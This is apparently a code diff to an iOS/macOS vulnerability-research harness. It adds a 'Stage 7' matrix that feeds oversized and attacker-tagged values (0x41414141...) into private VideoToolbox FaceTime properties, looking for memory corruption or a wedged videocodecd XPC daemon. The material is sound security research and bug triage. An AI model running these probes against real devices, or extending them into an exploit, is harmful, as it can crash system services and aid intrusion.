@@ -87,6 +87,7 @@ typedef struct {
     volatile int cbCount;
     OSStatus lastStatus;
     char summary[512];
+    char first[512]; // Stage 7: keep cb#1 (IDR, carries the SPS) alongside cb#2
 } Stage6ProbeResult;
 
 static NSString *HexDumpSlice(const uint8_t *buf, size_t len, size_t maxBytes) {
@@ -111,6 +112,7 @@ static void Stage6OutputCallback(void *outputCallbackRefCon,
         snprintf(res->summary, sizeof(res->summary),
                  "cb#%d st=%d info=0x%x sbuf=NULL",
                  res->cbCount, (int)status, (unsigned)infoFlags);
+        if (res->cbCount == 1) snprintf(res->first, sizeof(res->first), "%s", res->summary);
         return;
     }
     // Real SampleAttachments (array of dicts - CMCopyDictionaryOfAttachments is empty)
@@ -150,6 +152,7 @@ static void Stage6OutputCallback(void *outputCallbackRefCon,
              res->cbCount, (int)status, (unsigned)infoFlags,
              (unsigned long)saKeys, paramCount,
              [spsHex UTF8String], totalLen, [nalHex UTF8String]);
+    if (res->cbCount == 1) snprintf(res->first, sizeof(res->first), "%s", res->summary);
 }
 
 static CVPixelBufferRef CreateDummyNV12Buffer(int width, int height) {
@@ -241,6 +244,124 @@ static void RunStage6_XPCLeakAndBoundaryAudit(NSMutableString *log) {
         }
     }
     CVPixelBufferRelease(px);
+}
+
+// === Stage 7 (analyst): WHY -17691? value x count matrix before Prepare with
+// AllowFrameReordering=NO + UserRPS container-format ladder.
+static void Stage7DPBRow(NSMutableString *log, int count, long long val, BOOL afterPrepare) {
+    Stage6ProbeResult res;
+    memset(&res, 0, sizeof(res));
+    snprintf(res.summary, sizeof(res.summary), "(no cb)");
+    snprintf(res.first, sizeof(res.first), "(no cb)");
+    VTCompressionSessionRef session = NULL;
+    OSStatus st = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
+        NULL, NULL, NULL, Stage6OutputCallback, &res, &session);
+    if (st != noErr || !session) {
+        [log appendFormat:@"  dpb x%-2d val=0x%llx create=%d\n", count, val, (int)st];
+        return;
+    }
+    // Analyst: reordering OFF so the P-frame callback cannot lag behind.
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+    VTSessionSetProperty(session, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
+    NSMutableArray *arr = [NSMutableArray arrayWithCapacity:(NSUInteger)count];
+    for (int k = 0; k < count; k++) [arr addObject:@(val)];
+    OSStatus setSt = 0;
+    if (!afterPrepare) {
+        setSt = VTSessionSetProperty(session, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
+    }
+    VTCompressionSessionPrepareToEncodeFrames(session);
+    if (afterPrepare) {
+        setSt = VTSessionSetProperty(session, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
+    }
+    CVPixelBufferRef px = CreateDummyNV12Buffer(192, 144);
+    if (px) {
+        VTCompressionSessionEncodeFrame(session, px, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+        VTCompressionSessionEncodeFrame(session, px, CMTimeMake(1, 30), kCMTimeInvalid, NULL, NULL, NULL);
+        int waited = 0;
+        while (res.cbCount < 2 && waited < 300) { usleep(2000); waited += 2; }
+        CVPixelBufferRelease(px);
+    }
+    [log appendFormat:@"  dpb x%-2d val=0x%016llx set@%s=%d cbs=%d | first: %s | last: %s\n",
+     count, val, afterPrepare ? "post" : "pre", (int)setSt, res.cbCount, res.first, res.summary];
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+}
+
+static void RunStage7_MalfunctionMatrix(NSMutableString *log) {
+    [log appendString:@"\n--- Stage 7: -17691 value x count matrix + UserRPS container ladder ---\n"];
+
+    // 7A: uniform values at the biting count x34 (set BEFORE prepare)
+    [log appendString:@"  [7A: x34 uniform values, set BEFORE prepare, reordering=NO]\n"];
+    long long vals[] = { 0, 1, 15, 16, 31, 32, 34, 35, -1, 0x4141414141410000LL };
+    for (int vi = 0; vi < 10; vi++) {
+        Stage7DPBRow(log, 34, vals[vi], NO);
+    }
+    // 7B: counts x {valid 0, tagged} - does a valid index avoid -17691?
+    [log appendString:@"  [7B: counts x val(0 vs tagged), set BEFORE prepare]\n"];
+    int cnts[] = { 2, 4, 8, 15, 16, 34 };
+    long long bvals[] = { 0, 0x4141414141410000LL };
+    for (int ci = 0; ci < 6; ci++) {
+        for (int vi = 0; vi < 2; vi++) {
+            Stage7DPBRow(log, cnts[ci], bvals[vi], NO);
+        }
+    }
+    // 7B-control: Stage 3 timing (set AFTER prepare) with the biting payload
+    [log appendString:@"  [7B-control: x34 tagged set AFTER prepare (Stage 3 timing)]\n"];
+    Stage7DPBRow(log, 34, 0x4141414141410000LL, YES);
+
+    // 7C: UserRPSForFaceTime container-format ladder (analyst: why -12912?)
+    [log appendString:@"  [7C: UserRPS container ladder (fresh session per candidate)]\n"];
+    NSMutableArray *s0 = [NSMutableArray array], *s1 = [NSMutableArray array];
+    for (int i = 0; i < 32; i++) { [s0 addObject:@(-(i + 1))]; [s1 addObject:@(i + 1)]; }
+    NSDictionary *rpsDict = @{
+        @"AbsDeltaRPSMinus1": s0, @"DeltaRPSSign": s1,
+        @"NumNegativePics": @32, @"NumPositivePics": @32,
+        @"UsedByCurrPicS0": @0xFFFFFFFFU, @"UsedByCurrPicS1": @0xFFFFFFFFU,
+    };
+    NSMutableArray *flat = [NSMutableArray array];
+    [flat addObjectsFromArray:s0];
+    [flat addObjectsFromArray:s1];
+    int64_t blob[64];
+    for (int i = 0; i < 32; i++) { blob[i] = -(int64_t)(i + 1); blob[32 + i] = (int64_t)(i + 1); }
+    NSData *cfdata = [NSData dataWithBytes:blob length:sizeof(blob)];
+    NSArray *cands = @[ @[rpsDict], rpsDict, flat, cfdata ];
+    NSArray *names = @[ @"wrapped @[dict]", @"bare dict", @"flat 64 numbers", @"CFData 512B" ];
+    for (NSUInteger ci = 0; ci < cands.count; ci++) {
+        Stage6ProbeResult res;
+        memset(&res, 0, sizeof(res));
+        snprintf(res.summary, sizeof(res.summary), "(no cb)");
+        snprintf(res.first, sizeof(res.first), "(no cb)");
+        VTCompressionSessionRef session = NULL;
+        NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
+        OSStatus st = VTCompressionSessionCreate(
+            kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
+            (__bridge CFDictionaryRef)spec, NULL, NULL, Stage6OutputCallback, &res, &session);
+        if (st != noErr || !session) {
+            [log appendFormat:@"  rps[%@] create=%d\n", names[ci], (int)st];
+            continue;
+        }
+        VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+        VTSessionSetProperty(session, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
+        OSStatus setSt = VTSessionSetProperty(session, CFSTR("UserRPSForFaceTime"),
+                                              (__bridge CFTypeRef)cands[ci]);
+        VTCompressionSessionPrepareToEncodeFrames(session);
+        OSStatus e1 = -1;
+        CVPixelBufferRef px = CreateDummyNV12Buffer(192, 144);
+        if (px) {
+            VTCompressionSessionEncodeFrame(session, px, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+            NSDictionary *fp = @{ @"UserRPSForFaceTime": cands[ci] };
+            e1 = VTCompressionSessionEncodeFrame(session, px, CMTimeMake(1, 30), kCMTimeInvalid,
+                                                 (__bridge CFDictionaryRef)fp, NULL, NULL);
+            int waited = 0;
+            while (res.cbCount < 2 && waited < 300) { usleep(2000); waited += 2; }
+            CVPixelBufferRelease(px);
+        }
+        [log appendFormat:@"  rps[%@] set=%d frameEncode=%d cbs=%d | first: %s | last: %s\n",
+         names[ci], (int)setSt, (int)e1, res.cbCount, res.first, res.summary];
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+    }
 }
 
 static CVPixelBufferRef KPH9CreatePixelBuffer(int width, int height) {
@@ -363,6 +484,8 @@ static NSString *KPH9RunTimed(NSString *label, int64_t timeoutMs, BOOL *outTimed
         if (st != noErr || !s) return out;
 
         VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
+        // Analyst: reordering OFF - the P-frame cb must not lag into the next read.
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
         OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
         [out appendFormat:@"  prepare -> %d\n", (int)prep];
 
@@ -411,6 +534,9 @@ static NSString *KPH9RunTimed(NSString *label, int64_t timeoutMs, BOOL *outTimed
             OSStatus cfSt = KPH9CompleteStatus(s, 500);
             [out appendFormat:@"  CompleteFrames after smash -> %d%s\n", (int)cfSt,
              (cfSt == INT32_MIN) ? " (TIMEOUT - pipeline wedged)" : ""];
+            // Clear the sink: CompleteFrames may have pushed encode[1]'s late
+            // callback in here - the old readout made encode[2] steal it.
+            @synchronized (cbSink) { [cbSink removeAllObjects]; }
             // Survival probe: second P-frame into the same session - did the
             // XPC worker/encoder die on encode[1] or swallow the 32+32 RPS?
             OSStatus e2 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(2, 30), kCMTimeInvalid,
@@ -704,6 +830,21 @@ static NSString *KPH9RunTimed(NSString *label, int64_t timeoutMs, BOOL *outTimed
             return out;
         });
         [report appendString:s6];
+    }
+
+    // -------------------------------------------------------------------------
+    // Stage 7: -17691 malfunction matrix + UserRPS container ladder
+    // -------------------------------------------------------------------------
+    [self journal:@"Stage 7: -17691 matrix + UserRPS containers"];
+    if (vtHung) {
+        [report appendString:@"\n--- Stage 7 skipped (videocodecd XPC timed out) ---\n"];
+    } else {
+        NSString *s7 = KPH9RunTimed(@"Stage7-Matrix", 25000, &vtHung, ^NSString *{
+            NSMutableString *out = [NSMutableString string];
+            RunStage7_MalfunctionMatrix(out);
+            return out;
+        });
+        [report appendString:s7];
     }
 
     [report appendFormat:@"\nVERDICT: %@\n", vtHung ? @"VIDEOCODECD_XPC_TIMEOUT (reboot device to clear wedged daemon)" : @"COMPLETED_CLEAN"];
